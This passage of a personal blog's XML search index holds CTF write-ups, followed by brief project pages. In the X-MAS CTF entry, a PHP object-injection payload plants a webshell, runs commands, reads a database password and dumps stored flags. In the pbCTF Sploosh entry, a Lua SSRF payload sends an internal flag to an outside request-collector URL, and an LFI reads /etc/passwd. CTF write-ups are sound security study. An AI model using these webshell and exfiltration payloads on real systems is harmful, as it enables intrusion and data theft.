class="variable">$newContent</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;newContent=<span class="variable">$newContent</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;file_name,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fwrite(<span class="variable">$fd</span>,<span class="keyword">$this</span>-&gt;newContent);</span><br><span class="line">    fclose(<span class="variable">$fd</span>);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setFooter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;newFooter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$newFooter</span>=unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&quot;newFooter&quot;</span>]));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;footer&quot; style=&quot;color: white&quot;&gt;&#x27;</span>.<span class="variable">$newFooter</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;footer&quot; style=&quot;color: white&quot;&gt;PWNgyan 2020!&lt;/div&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$page</span> = <span class="keyword">new</span> pageContent;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$page</span>;</span><br><span class="line">setFooter();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>I’m going to hack the site using problem 1 on the CTF site. If you come into question 1, you can find the code above.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;file_name,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">  fwrite(<span class="variable">$fd</span>,<span class="keyword">$this</span>-&gt;newContent);</span><br><span class="line">  fclose(<span class="variable">$fd</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Looking at the code, you can see that when the destructor runs, it creates a file. After seeing this, I thought I should upload a web shell using PHP Object Injection.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:9:&quot;file_name&quot;;s:10:&quot;.&#x2F;abcd.php&quot;;s:10:&quot;newContent&quot;;s:20:&quot;&lt;?php system(&quot;ls&quot;)?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, I just wrote a simple payload and sent it as above, but the file was not created well. So, mentality went out and did this and that, and suddenly <code>as3617</code> released PHP Object Injection PPT.<br><br></p><p>Looking at this PPT, I learned that when a variable is defined as Private, Null Byte is attached to both sides of the variable.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:11:&quot;file_name&quot;;s:10:&quot;.&#x2F;abcd.php&quot;;s:12:&quot;newContent&quot;;s:20:&quot;&lt;?php system(&quot;ls&quot;)?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, based on this, I wrote the payload again as above, but it didn’t work well. So I couldn’t solve the problem because of this.<br><br></p><p>So, after the contest, I asked a person belonging to Defenit who was all over the web. It turns out that if the variable is defined as private, you need to reference the variable like \x00classname\x00variable.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:22:&quot;�pageContent�file_name&quot;;s:15:&quot;data&#x2F;pyburp.php&quot;;s:23:&quot;�pageContent�newContent&quot;;s:15:&quot;&lt;?&#x3D;&#96;$_GET[x]&#96;?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, finally, I wrote the payload as above.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%207.29.00.png?raw=true"><br>When I uploaded the webshell and accessed the file, I was able to confirm that the webshell was uploaded well.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;</span><br><span class="line">output &#x3D;&gt; ctfx</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx</span><br><span class="line">output &#x3D;&gt; composer.json composer.lock htdocs include install writable</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx&#x2F;include</span><br><span class="line">output &#x3D;&gt; Config.php cache.inc.php captcha.inc.php config config_loader.inc.php constants.inc.php db.inc.php email.inc.php files.inc.php general.inc.php json.inc.php language layout mellivora.inc.php raceconditions.inc.php session.inc.php thirdparty two_factor_auth.inc.php xsrf.inc.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx&#x2F;include&#x2F;config</span><br><span class="line">&#x3D;&gt; config.default.inc.php db.default.inc.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;cat ~&#x2F;ctfx&#x2F;include&#x2F;config&#x2F;db.default.inc.php</span><br><span class="line">output &#x3D;&gt; </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> *</span><br><span class="line"> * This file contains default configuration.</span><br><span class="line"> *</span><br><span class="line"> *        DO NOT MAKE CHANGES HERE</span><br><span class="line"> *</span><br><span class="line"> * Copy this file and name it &quot;db.inc.php&quot;</span><br><span class="line"> * before making any changes. Any changes in</span><br><span class="line"> * db.inc.php will override the default</span><br><span class="line"> * config. It is also possible to override</span><br><span class="line"> * configuration options using environment</span><br><span class="line"> * variables. Environment variables override</span><br><span class="line"> * both the default settings and the hard-coded</span><br><span class="line"> * user defined settings.</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_ENGINE&#39;, &#39;mysql&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_HOST&#39;, &#39;localhost&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_PORT&#39;, 3306);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_NAME&#39;, &#39;mellivora&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_USER&#39;, &#39;mellivora&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_PASSWORD&#39;, &#39;rac9138cn98ascnascud&#39;);</span><br></pre></td></tr></table></figure><p>When I checked using a web shell, I could see that the Database configuration file exists. Then, let’s connect to the DB using the mysql command.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%207.40.25.png?raw=true"><br>[+] If you know the database name, user name, and password, you can run the query as above using the -e option of the mysql command and see the result immediately.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e &quot;show tables;&quot;</span><br><span class="line">output &#x3D;&gt; Tables_in_mellivora categories challenges cookie_tokens countries exceptions files hints ip_log news reset_password submissions two_factor_auth user_types users</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e &quot;select * from challenges&quot;</span><br><span class="line">output &#x3D;&gt; </span><br><span class="line">idaddedadded_bytitlecategorydescriptionexposedavailable_fromavailable_untilflagcase_insensitiveautomarkpointsinitial_pointsminimum_pointssolve_decaysolvesnum_attempts_allowedmin_seconds_between_submissionsrelies_on</span><br><span class="line">116060783851Brutus1Everyone hates Brutus! But does Brutus hate everyone? Who knows? Or rather, who cares?! What we care about here is the flag. Nothing more.</span><br><span class="line">\n</span><br><span class="line">\nLink: [url]http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050[&#x2F;url]115846992001617235206pwngyanctf&#123;we_dont_remember_the_actual_flag_:(&#125;01500500501002050</span><br><span class="line">216060810561Hard Challenge1Now it&#39;s time for a ramp-up in difficulty. You thought Brutus was hard? Ha! Check this one out then, punk.</span><br><span class="line">\n</span><br><span class="line">\nLink: [url]http:&#x2F;&#x2F;challs.xmas.htsp.ro:3051[&#x2F;url]115846992001617235206X-MAS&#123;Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0&#125;01500500501000050</span><br><span class="line">316060811361Hello World!2Welcome to PWNgyan CTF 2020!</span><br><span class="line">\n</span><br><span class="line">\n[b]pwngyanctf&#123;H3ll0_H4ckerz_3141cc5f&#125;[&#x2F;b]115846992001617235206pwngyanctf&#123;H3ll0_H4ckerz_3141cc5f&#125;0110101013050</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>When I ran through the database using the mysql command, there was a flag of the table called challenges.</p><p><code>FLAG : X-MAS&#123;Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0&#125;</code></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blind Command Injection </tag>
            
            <tag> Hash Length Extension Attack </tag>
            
            <tag> XSS </tag>
            
            <tag> PHP Object Injection </tag>
            
            <tag> Type juggling </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pbCTF 2020 Write Up</title>
      <link href="2020/12/07/2020-12-07-pb-CTF/"/>
      <url>2020/12/07/2020-12-07-pb-CTF/</url>
      
        <content type="html"><![CDATA[<p>I participated by opening the CTF this time at Perfect Blue. Let’s write Write Up only for web challenges solved by CTF.</p><hr><h3 id="Web-Sploosh"><a href="#Web-Sploosh" class="headerlink" title="(Web) Sploosh"></a>(Web) Sploosh</h3><p><strong>Challenge Author :</strong> Corb3nik<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 156<br><br><strong>Solves :</strong> 5N<br></p><p>This time, we will solve a problem called Sploosh among web challenge from pbCTF.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%2012.27.01.png?raw=true"><br>When you come into challenge, you can see that there is a form for entering the URL, and you can download the source code by clicking here.<br><br></p><p>Once you think about it before looking at the source code, you might be suspicious of <code>SSRF</code> because it has the ability to type in the url.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fail</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&#123;&#125;&quot;</span>;</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$url</span> === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$json</span> = file_get_contents(<span class="string">&quot;http://splash:8050/render.json?timeout=1&amp;url=&quot;</span> . urlencode(<span class="variable">$url</span>));</span><br><span class="line">  <span class="variable">$out</span> = <span class="keyword">array</span>(<span class="string">&quot;geometry&quot;</span> =&gt; json_decode(<span class="variable">$json</span>)-&gt;geometry);</span><br><span class="line">  <span class="keyword">echo</span> (<span class="variable">$out</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Let’s check the api.php source code. You can see that the url is input and the file is opened and checked with the file_get_contents() function. And you can see that the file value is output as the geometry value.<br><br><br><br>SSRF seems to be fired by the <code>file_get_contents()</code> function of api.php.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$remote_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$remote_ip</span> === <span class="string">&quot;172.16.0.13&quot;</span> || <span class="variable">$remote_ip</span> === <span class="string">&#x27;172.16.0.14&#x27;</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;No flag for you :)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Let’s check the source code of flag.php. If the connection IP is <code>172.16.0.13</code> or <code>172.16.0.14</code>, you can see the flag is given.<br><br><br></p><p>And looking at the flag.php source code, you can see that the flag is only output on the internal server. So it looks like we need to put the flag in a specific variable and bring it to our private server.<br><br><br></p><p>Now I’ve searched for Sploosh to do an exploit. If you check <a href="https://splash.readthedocs.io/en/stable/scripting-tutorial.html#scripting-tutorial">Sploosh’s official homepage</a>, you find that you can create and run Lua scripts by connecting to the <code>execute</code> endpoint.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%201.13.22.png?raw=true"><br>The picture above is on the official Sploosh website. Looking at the contents, you can see that the <code>execute</code> endpoint sends the RCE payload using the lua_source parameter.</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">(exploit, args)</span></span></span><br><span class="line">  exploit:go(<span class="string">&quot;http://172.16.0.14/flag.php&quot;</span>)</span><br><span class="line">  <span class="keyword">local</span> flag = splash:html()</span><br><span class="line">  exploit:go(<span class="string">&quot;requestbin&quot;</span> .. flag)</span><br><span class="line">  <span class="keyword">return</span> &#123;geometry=data&#125;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>So, I wrote the SSRF + RCE payload as above using the lua script.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag = requests.get(<span class="string">&quot;http://172.16.0.14/flag.php&quot;</span>)</span><br><span class="line">requests.get(<span class="string">&quot;requestbin&quot;</span>+flag)</span><br></pre></td></tr></table></figure><p>If the exploit code is interpreted in Python, it is as above.<br><br><br></p><p>Finally, if you connect and send the exploit code above to the excute endpoint, a flag will come to requestbin. (<code>URL encoding</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : http%3A%2F%2Flocalhost%3A8050%2Fexecute%3Flua_source%3Dfunction%2520main%28splash%2C%2520args%29%2520splash%3Ago%28%2522http%3A%2F%2F172.16.0.14%2Fflag.php%2522%29%2520local%2520data%2520%3D%2520splash%3Ahtml%28%29%2520splash%3Ago%28%2522https:&#x2F;&#x2F;66409bdd5f994b912d1a7f0f28d3b33f.m.pipedream.net%2F%2522%2520..%2520data%29%2520return%2520%7Bgeometry%3Ddata%7D%2520end</span><br></pre></td></tr></table></figure><p>So, I’ll URL-encode the exploit code and pass it over.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%202.29.59.png?raw=true"><br>When I sent the above exploit payload, I could see the flag coming to the requestbin.</p><p><code>FLAG : pbctf&#123;1_h0p3_y0u_us3d_lua_f0r_th1s&#125;</code><br><br></p><hr><h3 id="Web-Apoche-I"><a href="#Web-Apoche-I" class="headerlink" title="(Web) Apoche I"></a>(Web) Apoche I</h3><p><strong>Challenge Author :</strong> theKidOfArcrania<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 58<br><br><strong>Solves :</strong> 5N<br></p><p>This time, we will solve a challenge called Apoche I among web challenge from pbCTF.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%205.19.31.png?raw=true"><br>Looking at the challenge description, there are 5 URLs given. You can connect to an open server among 5 servers. (Some servers are closed.)<br><br></p><p>And looking at the hint, it says to get information about the binary.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%205.23.10.png?raw=true"><br>I connected to 34.68.159.75:41521, and when I checked the robots.txt file, I could see that there is a secret directory. I thought LFI would happen here, so I grabbed a proxy and attempted an LFI attack.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%205.27.43.png?raw=true"><br>When I grabbed the request using Burp Suite and accessed the <code>/etc/passwd</code> file, I could see that the <code>LFI</code> worked well.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%205.32.50.png?raw=true"><br>So I accessed <code>/proc/self/exe</code> to get the <code>binary file</code>, and when I searched for <code>pbctf&#123;</code>, I could see that the binary file had a flag.</p><p><code>FLAG : pbctf&#123;n0t_re4lly_apache_ap0che!&#125;</code><br><br></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Path Traversal </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Project (dJango)</title>
      <link href="2020/10/24/2020-10-24-Project-2/"/>
      <url>2020/10/24/2020-10-24-Project-2/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description "></a>Description <br></h1><p>N0named 팀을 활동할 때, dJango Project에 참여를 했었는데 그때 로그인, 회원가입, 비밀번호 찾기, 이메일 인증, 어드민 패널, 문제 관리 페이지 개발을 맡았었습니다. 이때 처음으로 dJango 웹 프레임워크를 이용해봤는데 에러 때문에 조금 애를 먹었지만 괜찮았던 거 같습니다. 하지만 갓 프레임워크는 flask, node인 거 같네요.<br></p><hr><h2 id="Things-used"><a href="#Things-used" class="headerlink" title="Things used"></a>Things used<br></h2><p>Language&nbsp;&nbsp;&nbsp;<code>HTML</code>, <code>python</code>, <code>php</code>, <code>javascript</code><br><br>Database&nbsp;&nbsp;&nbsp;&nbsp;<code>PostgreSQL</code><br><br>WF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>dJango</code><br><br>OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Ubuntu</code><br></p><hr><h2 id="Project-Member"><a href="#Project-Member" class="headerlink" title="Project Member"></a>Project Member<br></h2><p>(생략)<br><br><code>Jeongwon Jo</code><br><br>(생략)</p><hr><h2 id="Project-period"><a href="#Project-period" class="headerlink" title="Project period"></a>Project period<br></h2><p>undefined<br></p><hr><h2 id="Web-Service-Source-Code"><a href="#Web-Service-Source-Code" class="headerlink" title="Web Service Source Code"></a>Web Service Source Code</h2><p><a href="https://github.com/wjddnjs33/dJango_Project/tree/main/source">SOURCE</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> Project </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Project (PHP)</title>
      <link href="2020/06/05/2020-09-16-Project-1/"/>
      <url>2020/06/05/2020-09-16-Project-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description "></a>Description <br></h1><p>For this project, we developed a web service, hacking the developed web service, and wrote a report.</p><hr><h2 id="Things-used"><a href="#Things-used" class="headerlink" title="Things used"></a>Things used<br></h2><p>Language&nbsp;&nbsp;&nbsp;<code>HTML, PHP, Javascript</code><br><br>Database&nbsp;&nbsp;&nbsp;&nbsp;<code>MySQL</code><br><br>Server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Apache 2</code><br><br>OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Ubuntu</code><br></p><hr><h2 id="Project-Member"><a href="#Project-Member" class="headerlink" title="Project Member"></a>Project Member<br></h2><p><code>Jeongwon Jo (Captain)</code></p><hr><h2 id="Project-period"><a href="#Project-period" class="headerlink" title="Project period"></a>Project period<br></h2><p>2020.9.16 ~ 2020.9.24 (9 days)<br></p><hr><h2 id="Web-Service-Source-Code"><a href="#Web-Service-Source-Code" class="headerlink" title="Web Service Source Code"></a>Web Service Source Code</h2><p><a href="https://github.com/wjddnjs33/PHP_Project/tree/main/PHP_Project">SOURCE</a></p><hr><h2 id="Project-Report"><a href="#Project-Report" class="headerlink" title="Project Report"></a>Project Report<br></h2><p><a href="https://drive.google.com/file/d/1HHR8SHupKmN8GULlptPNFeVe7JJEUXK9/view">PDF</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> Project </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Project </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
